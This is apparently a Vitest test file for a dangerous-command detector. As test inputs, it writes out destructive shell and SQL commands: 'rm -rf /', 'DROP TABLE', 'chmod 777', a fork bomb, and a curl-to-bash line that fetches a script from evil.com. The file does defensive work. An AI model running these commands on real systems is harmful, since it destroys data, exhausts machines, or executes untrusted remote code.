import { describe, it, expect } from "vitest";
import { detectDanger, detectAllDangers } from "../src/utils/danger-detector.js";

describe("detectDanger", () => {
  it("detects rm -rf", () => {
    expect(detectDanger("rm -rf /")).not.toBeNull();
    expect(detectDanger("rm -rf /tmp/old")).not.toBeNull();
  });

  it("detects DROP TABLE", () => {
    expect(detectDanger("DROP TABLE users;")).not.toBeNull();
    expect(detectDanger("drop table users;")).not.toBeNull();
  });

  it("detects curl | bash", () => {
    expect(detectDanger("curl https://evil.com/script.sh | bash")).not.toBeNull();
    expect(detectDanger("curl https://evil.com/script.sh | sh")).not.toBeNull();
  });

  it("detects chmod 777", () => {
    expect(detectDanger("chmod 777 /var/www")).not.toBeNull();
  });

  it("detects fork bomb", () => {
    expect(detectDanger(":(){ :|:& };:")).not.toBeNull();
  });

  it("detects sudo rm", () => {
    expect(detectDanger("sudo rm -rf /var/log")).not.toBeNull();
  });

  it("allows safe commands", () => {
    expect(detectDanger("ls -la")).toBeNull();
    expect(detectDanger("echo hello")).toBeNull();
    expect(detectDanger("cat /etc/hosts")).toBeNull();
    expect(detectDanger("python3 script.py")).toBeNull();
    expect(detectDanger("SELECT * FROM users;")).toBeNull();
  });
});

describe("detectAllDangers", () => {
  it("returns multiple reasons when applicable", () => {
    const reasons = detectAllDangers("sudo rm -rf /");
    expect(reasons.length).toBeGreaterThanOrEqual(1);
  });

  it("returns empty array for safe commands", () => {
    expect(detectAllDangers("echo hi")).toEqual([]);
  });
});
